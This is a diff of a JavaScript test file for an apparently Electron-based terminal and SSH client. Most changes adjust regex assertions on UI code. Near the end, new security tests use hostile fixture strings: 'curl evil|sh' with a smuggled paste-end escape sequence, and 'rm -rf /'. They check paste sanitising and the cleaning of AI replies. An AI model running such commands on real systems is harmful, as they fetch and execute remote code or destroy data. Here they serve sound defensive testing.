@@ -16,7 +16,7 @@ const wordmarkPngPath = path.join(root, 'src/renderer/assets/auxillo-wordmark.pn
 
 test('renderer reattaches or closes existing main-process terminal sessions after reload', () => {
   assert.match(renderer, /function restoreInitialSessions\(sessions = \[\]\)/u);
-  assert.match(renderer, /createTerminalTab\(session, profile\)/u);
+  assert.match(renderer, /createTerminalTab\(session, profile,/u);
   assert.match(renderer, /api\.terminal\.close\(session\.id\)\.catch\(\(\) => \{\}\)/u);
   assert.match(renderer, /restoreInitialSessions\(initial\.sessions \|\| \[\]\)/u);
 });
@@ -122,15 +122,15 @@ test('primary text inputs have explicit accessible names and motion can be reduc
   assert.match(indexHtml, /id="sftp-path"[^>]*aria-label="Remote path"/u);
   assert.match(indexHtml, /id="new-profile-button"[^>]*aria-label="New connection"/u);
   assert.match(indexHtml, /id="sftp-close"[^>]*aria-label="Close SFTP"/u);
-  assert.match(renderer, /className: 'modal-close'[^\n]*text: '×'[^\n]*title: 'Close'[^\n]*attrs: \{ 'aria-label': 'Close dialog' \}/u);
+  assert.match(renderer, /className: 'modal-close'[^\n]*text: '×'[^\n]*title: uiText\('Close'\)[^\n]*attrs: \{ 'aria-label': uiText\('Close dialog'\) \}/u);
   assert.match(styles, /@media \(prefers-reduced-motion: reduce\)/u);
 });
 
 test('welcome copy advertises every supported quick-connect protocol', () => {
   assert.match(indexHtml, /SSH, Mosh, Telnet, FTP, FTPS, RDP, VNC or serial/u);
-  assert.match(indexHtml, /<option value="ftp">FTP<\/option>/u);
-  assert.match(indexHtml, /<option value="ftps">FTPS<\/option>/u);
-  assert.match(indexHtml, /<option value="serial">Serial<\/option>/u);
+  assert.match(indexHtml, /<option value="ftp"[^>]*>FTP<\/option>/u);
+  assert.match(indexHtml, /<option value="ftps"[^>]*>FTPS<\/option>/u);
+  assert.match(indexHtml, /<option value="serial"[^>]*>Serial<\/option>/u);
   assert.match(renderer, /if \(protocol === 'serial'\) \{/u);
   assert.match(renderer, /device: value/u);
 });
@@ -146,7 +146,9 @@ test('renderer exposes a command snippets manager that can run snippets in the a
   assert.match(indexHtml, /id="snippets-button"/u);
   assert.match(renderer, /function openSnippetsModal\(\)/u);
   assert.match(renderer, /function runSnippet\(snippet\)/u);
-  assert.match(renderer, /api\.terminal\.write\(tab\.id, `\$\{snippet\.command\}\\r`\)/u);
+  assert.match(renderer, /api\.terminal\.write\(tab\.id, `\$\{lines\.join\('\\r'\)\}\\r`\)/u);
+  // Imported or multi-line snippets and dangerous commands are confirmed in full first.
+  assert.match(renderer, /if \(hit \|\| lines\.length > 1\) \{/u);
   assert.match(renderer, /api\.snippets\.save/u);
   assert.match(renderer, /api\.snippets\.delete/u);
 });
@@ -165,7 +167,7 @@ test('renderer keeps Auxillo company branding linked to the main website', () =>
   assert.match(indexHtml, /id="website-button"[^>]*title="Visit auxillo\.tech"/u);
   assert.match(indexHtml, /class="brand-link"[\s\S]{0,200}?auxillo-wordmark\.png/u);
   assert.match(indexHtml, /id="statusbar-website"[^>]*>auxillo\.tech</u);
-  assert.match(indexHtml, /class="product-name">Aux Command<\/span>/u);
+  assert.match(indexHtml, /class="product-name"[^>]*>Aux Command<\/span>/u);
   assert.match(indexHtml, /class="[^"]*workspace-commandbar[^"]*"/u);
   assert.match(indexHtml, /class="welcome-capabilities"/u);
   assert.match(renderer, /statusbarWebsite: \$\('#statusbar-website'\)/u);
@@ -192,7 +194,7 @@ test('renderer exposes a tiled multi-session layout for split-pane operations', 
   assert.match(indexHtml, /id="layout-toggle"/u);
   assert.match(renderer, /function toggleTerminalLayout\(\)/u);
   assert.match(renderer, /state\.layout = state\.layout === 'single' \? 'grid' : 'single'/u);
-  assert.match(renderer, /elements\.terminalStack\.classList\.toggle\('layout-grid', state\.layout === 'grid'\)/u);
+  assert.match(renderer, /elements\.terminalStack\.classList\.toggle\('layout-grid', state\.layout === 'grid' && !state\.focusMode\)/u);
   assert.match(renderer, /for \(const tab of state\.tabs\.values\(\)\) \{/u);
   assert.match(styles, /\.terminal-stack\.layout-grid/u);
   assert.match(styles, /grid-template-columns: repeat\(auto-fit, minmax\(var\(--pane-min-width\), 1fr\)\)/u);
@@ -215,7 +217,7 @@ test('renderer exposes guarded broadcast input across terminal sessions', () => 
   assert.match(renderer, /await confirmAction\(\{/u);
   assert.match(renderer, /Enable broadcast input\?/u);
   assert.match(renderer, /elements\.broadcastWarning\.hidden = !state\.broadcastInput/u);
-  assert.match(renderer, /const targets = state\.broadcastInput \? \[\.\.\.state\.tabs\.values\(\)\]\.filter\(\(candidate\) => candidate\.terminal\) : \[tab\]/u);
+  assert.match(renderer, /const targets = state\.broadcastInput \? \[\.\.\.state\.tabs\.values\(\)\]\.filter\(\(candidate\) => candidate\.terminal && !candidate\.closed\) : \[tab\]/u);
   assert.match(renderer, /api\.terminal\.write\(target\.id, data\)/u);
   assert.match(renderer, /elements\.broadcastToggle\.classList\.toggle\('active', state\.broadcastInput\)/u);
 });
@@ -226,10 +228,10 @@ test('renderer CSP permits xterm runtime style updates without allowing inline s
   assert.doesNotMatch(indexHtml, /script-src[^;]*'unsafe-inline'/u);
 });
 
-test('renderer forces xterm refresh after PTY data writes', () => {
+test('renderer lets xterm batch PTY rendering without redundant full-screen refresh', () => {
   assert.match(renderer, /function writeTerminalData\(tab, data\)/u);
-  assert.match(renderer, /tab\.terminal\.write\(payload, \(\) => \{/u);
-  assert.match(renderer, /tab\.terminal\.refresh\(0, tab\.terminal\.rows - 1\)/u);
+  assert.match(renderer, /tab\.terminal\.write\(payload\)/u);
+  assert.doesNotMatch(renderer, /tab\.terminal\.refresh\(0, tab\.terminal\.rows - 1\)/u);
 });
 
 test('snippets modal refreshes persisted state before rendering rows', () => {
@@ -275,7 +277,7 @@ test('renderer exposes guarded macro recording and replay through snippets', () 
   assert.match(renderer, /macroRecording: null/u);
   assert.match(renderer, /async function toggleMacroRecording\(\)/u);
   assert.match(renderer, /Macro recording may capture secrets/u);
-  assert.match(renderer, /recordTerminalMacroInput\(data\)/u);
+  assert.match(renderer, /recordTerminalMacroInput\(tab, data\)/u);
   assert.match(renderer, /await api\.snippets\.save\(\{/u);
   assert.match(renderer, /Macro recorded/u);
 });
@@ -291,18 +293,18 @@ test('renderer exposes a command palette for actions, profiles and snippets', ()
   assert.match(renderer, /aria-selected/u);
   assert.match(renderer, /Run snippet/u);
   assert.match(renderer, /Connect profile/u);
-  assert.match(renderer, /event\.code === 'KeyP'/u);
+  assert.match(renderer, /shortcut\('palette'\)/u);
 });
 
 test('renderer exposes duplicate and reconnect session operations', () => {
   assert.match(renderer, /async function duplicateActiveSession\(\)/u);
   assert.match(renderer, /async function reconnectActiveSession\(\)/u);
-  assert.match(renderer, /const replacement = await connectProfile\(tab\.profile\)/u);
+  assert.match(renderer, /const replacement = await connectProfile\(tab\.profile,/u);
   assert.match(renderer, /if \(replacement\) await closeTab\(tab\.id\)/u);
   assert.match(renderer, /Duplicate session/u);
   assert.match(renderer, /Reconnect session/u);
-  assert.match(renderer, /event\.code === 'KeyD'/u);
-  assert.match(renderer, /event\.code === 'KeyR'/u);
+  assert.match(renderer, /shortcut\('duplicate'\)/u);
+  assert.match(renderer, /shortcut\('reconnect'\)/u);
 });
 
 test('live terminal closure requires explicit confirmation', () => {
@@ -354,8 +356,8 @@ test('graphical SFTP exposes remote text file view and edit actions', () => {
   assert.match(preload, /readText: \(profile, remotePath\) => invoke\('sftp:read-text', profile, remotePath\)/u);
   assert.match(preload, /writeText: \(profile, remotePath, content\) => invoke\('sftp:write-text', profile, remotePath, content\)/u);
   assert.match(renderer, /async function openRemoteTextEditor\(\)/u);
-  assert.match(renderer, /await api\.sftp\.readText\(state\.sftp\.profile, entry\.path\)/u);
-  assert.match(renderer, /await api\.sftp\.writeText\(state\.sftp\.profile, entry\.path, editor\.value\)/u);
+  assert.match(renderer, /await api\.sftp\.readText\(editingProfile, entry\.path\)/u);
+  assert.match(renderer, /await api\.sftp\.writeText\(editingProfile, entry\.path, editor\.value\)/u);
   assert.match(renderer, /elements\.sftpEdit\.addEventListener\('click', openRemoteTextEditor\)/u);
   assert.match(renderer, /else openRemoteTextEditor\(\)/u);
 });
@@ -365,7 +367,7 @@ test('graphical SFTP exposes drag-and-drop upload with main-process path validat
   assert.match(preload, /uploadPaths: \(profile, remoteDirectory, localPaths\) => invoke\('sftp:upload-paths', profile, remoteDirectory, localPaths\)/u);
   assert.match(preload, /filePath: \(file\) => webUtils\.getPathForFile\(file\)/u);
   assert.match(ipc, /sftp:upload-paths/u);
-  assert.match(ipc, /path\.isAbsolute\(localPath\)/u);
+  assert.match(ipc, /fileBrowser\.plan\(/u);
   assert.match(renderer, /function bindSftpDragAndDrop\(\)/u);
   assert.match(renderer, /handleSftpDrop\(event\)/u);
   assert.match(renderer, /Drag files here to upload/u);
@@ -380,7 +382,7 @@ test('main process routes FTP and FTPS profiles through the FTP service', () => 
 
 test('renderer exposes explicit SCP fallback transfer mode for SSH profiles', () => {
   assert.match(renderer, /selectInput\('transferMode'/u);
-  assert.match(renderer, /\['scp', 'SCP fallback'/u);
+  assert.match(renderer, /\['scp', uiText\('SCP fallback'\)/u);
   assert.match(renderer, /SCP is upload\/download fallback only/u);
   assert.match(renderer, /transferMode: String\(values\.get\('transferMode'\) \|\| 'sftp'\)/u);
 });
@@ -397,7 +399,7 @@ test('UI separates session navigation from contextual commands and labels global
 
 test('profile rows expose separate Connect and Edit buttons', () => {
   assert.match(renderer, /className: 'profile-connect'/u);
-  assert.match(renderer, /className: 'profile-connect-label', text: 'Connect'/u);
+  assert.match(renderer, /className: 'profile-connect-label', text: uiText\('Connect'\)/u);
   assert.match(renderer, /attrs: \{ role: 'listitem'/u);
   assert.doesNotMatch(renderer, /attrs: \{ role: 'button', tabindex: '0', 'aria-label': `\$\{profile\.name\}/u);
 });
@@ -418,7 +420,7 @@ test('initialization failure has a durable recovery surface', () => {
 
 test('low-value pane resizing uses coalesced status instead of stacked toasts', () => {
   assert.doesNotMatch(renderer, /toast\('Pane size updated'/u);
-  assert.match(renderer, /setStatus\(`Pane size/u);
+  assert.match(renderer, /setStatus\(uiText\("Pane size/u);
   assert.match(renderer, /if \(kind !== 'error'\) \{[\s\S]*setStatus/u);
   assert.match(renderer, /existing\.remove\(\)/u);
 });
@@ -438,9 +440,9 @@ test('renderer exposes and applies per-profile terminal appearance settings', ()
   assert.match(renderer, /terminalFontSize/u);
   assert.match(renderer, /terminalCursorStyle/u);
   assert.match(renderer, /terminalScrollback/u);
-  assert.match(renderer, /field\('Terminal theme'/u);
-  assert.match(renderer, /field\('Terminal font'/u);
-  assert.match(renderer, /field\('Scrollback lines'/u);
+  assert.match(renderer, /field\(uiText\('Terminal theme'\)/u);
+  assert.match(renderer, /field\(uiText\('Terminal font'\)/u);
+  assert.match(renderer, /field\(uiText\('Scrollback lines'\)/u);
 });
 
 test('FTP/FTPS disconnects carry the protocol through preload to the main router', () => {
@@ -463,9 +465,9 @@ test('transfer queue UI hydrates, counts, clears, and drops cancelled entries', 
 });
 
 test('embedded RDP reuses the shared remote-desktop tab with external fallback', () => {
-  assert.match(renderer, /function createRemoteDesktopTab\(result, profile, protocol\)/u);
+  assert.match(renderer, /function createRemoteDesktopTab\(result, profile, protocol, saved = \{\}\)/u);
   assert.match(renderer, /api\.rdp\.startEmbedded\(profile\)/u);
-  assert.match(renderer, /Embedded \$\{kind\} unavailable, launching external client/u);
+  assert.match(renderer, /Embedded \{p0\} unavailable, launching external client/u);
   assert.match(renderer, /if \(tab\.desktopKind === 'rdp'\) await api\.rdp\.stopEmbedded\(id\)/u);
   assert.match(preload, /startEmbedded: \(profile\) => invoke\('rdp:start-embedded', profile\)/u);
 });
@@ -509,4 +511,60 @@ test('first-run guided tour walks key surfaces and records completion', () => {
   assert.match(renderer, /api\.app\.saveOnboardingSettings\(\{ tourCompleted: true \}\)/u);
   assert.match(preload, /saveOnboardingSettings: \(onboarding\) => invoke\('app:save-onboarding-settings', onboarding\)/u);
   assert.match(styles, /\.tour-highlight/u);
+});
+
+test('terminal copy and paste behaves like a Linux terminal', () => {
+  const detached = fs.readFileSync(path.join(root, 'src/renderer/detached.js'), 'utf8');
+  // Right-click must not replace the highlight with the word under the pointer.
+  assert.match(renderer, /rightClickSelectsWord: false/u);
+  // Mouse highlights become the primary selection and, by default, the clipboard.
+  assert.match(renderer, /clipboardWrite\(selection, 'selection'\)/u);
+  assert.match(renderer, /state\.ui\.terminalCopyOnSelect !== false\) api\.system\.clipboardWrite\(selection\)/u);
+  // Middle-click pastes the primary selection once, and mouse-aware apps keep their clicks.
+  assert.match(renderer, /event\.button === 1 && !appOwnsMouse\(event\)\) \{\s*event\.preventDefault\(\);\s*event\.stopPropagation\(\);\s*pasteIntoTerminal\('selection'\)/u);
+  assert.match(renderer, /mouseTrackingMode !== 'none' && !event\.shiftKey/u);
+  // Keyboard copy/paste includes Ctrl+Insert / Shift+Insert and blocks the native duplicate paste.
+  assert.match(renderer, /event\.code === 'Insert'\)\) \{\s*event\.preventDefault\(\);\s*copyTerminalSelection/u);
+  assert.match(renderer, /event\.code === 'Insert'\)\) \{\s*event\.preventDefault\(\);\s*pasteIntoTerminal\(\)/u);
+  assert.match(renderer, /label: uiText\('Paste selection'\)/u);
+  assert.match(renderer, /point: \{ x: event\.clientX, y: event\.clientY \}/u);
+  assert.match(detached, /api\.copy\(text,'selection'\)/u);
+  assert.match(detached, /paste\('selection'\)/u);
+});
+
+test('pasted text cannot smuggle keypresses or run several lines unannounced', () => {
+  const start = renderer.indexOf('function sanitizePasteText');
+  const source = renderer.slice(start, renderer.indexOf('\n  }\n', start) + 4);
+  const sanitizePasteText = new Function(`${source}; return sanitizePasteText;`)();
+  // An embedded end-of-paste marker would let the rest run as typed input.
+  assert.equal(sanitizePasteText('echo hi\x1b[201~\ncurl evil|sh\n'), 'echo hi[201~\ncurl evil|sh\n');
+  assert.equal(sanitizePasteText('a\r\nb\rc\td\x03\x07\x9b'), 'a\nb\nc\td');
+  assert.match(renderer, /const text = sanitizePasteText\(await api\.system\.clipboardRead\(type\)\);\s*if \(!text \|\| !\(await confirmTerminalPaste\(tab, text\)\)\) return;/u);
+  assert.match(renderer, /state\.ui\.terminalPasteWarning === false \|\| \(!multiline && targets\.length < 2\)/u);
+  const detached = fs.readFileSync(path.join(root, 'src/renderer/detached.js'), 'utf8');
+  assert.match(detached, /const text=sanitize\(raw\)/u);
+  assert.match(detached, /window\.confirm\('Paste '\+lines\.length\+' lines\?/u);
+});
+
+test('terminal query replies are kept out of the command guard, macros and broadcast', () => {
+  const start = renderer.indexOf('const terminalReportPattern');
+  const end = renderer.indexOf('function dispatchTerminalInput', start);
+  const isTerminalReport = new Function(`${renderer.slice(start, end)}; return isTerminalReport;`)();
+  for (const report of ['\x1b[?1;2c', '\x1b[>0;276;0c', '\x1b[12;40R', '\x1b[0n', '\x1b]11;rgb:0606/0b0b/1313\x1b\\', '\x1b[I', '\x1b[<0;10;5M']) assert.equal(isTerminalReport(report), true, JSON.stringify(report));
+  for (const typed of ['ls\r', '\x1b[A', '\x1b[1;5C', '\x03', 'rm -rf /\r', '\x1b[200~x\x1b[201~']) assert.equal(isTerminalReport(typed), false, JSON.stringify(typed));
+  assert.match(renderer, /if \(isTerminalReport\(data\)\) \{\s*if \(!tab\.closed\) api\.terminal\.write\(tab\.id, data\)/u);
+  // Every committed line is checked, including lines edited with Tab or arrows.
+  assert.doesNotMatch(renderer, /\.filter\(\(commit\) => commit\.tracked\)\s*\.map\(\(commit\) => window\.AuxAssist\.dangerCheck/u);
+});
+
+test('AI replies with control characters are never typed into a terminal', () => {
+  assert.match(renderer, /if \(!command \|\| \/\[\\x00-\\x1f\\x7f-\\x9f\]\/u\.test\(command\)\) \{/u);
+  const { cleanCommandReply } = require('../src/main/services/ai-assist.cjs');
+  assert.equal(cleanCommandReply('ls\rcurl evil|sh\x03'), 'ls\ncurl evil|sh');
+});
+
+test('the VNC viewer frame has no clipboard permissions and OSC 8 links need Ctrl+click', () => {
+  assert.doesNotMatch(renderer, /allow: 'clipboard-read; clipboard-write'/u);
+  assert.match(renderer, /linkHandler: \{\s*allowNonHttpProtocols: false,/u);
+  assert.match(indexHtml, /frame-src aux-vnc:;/u);
 });
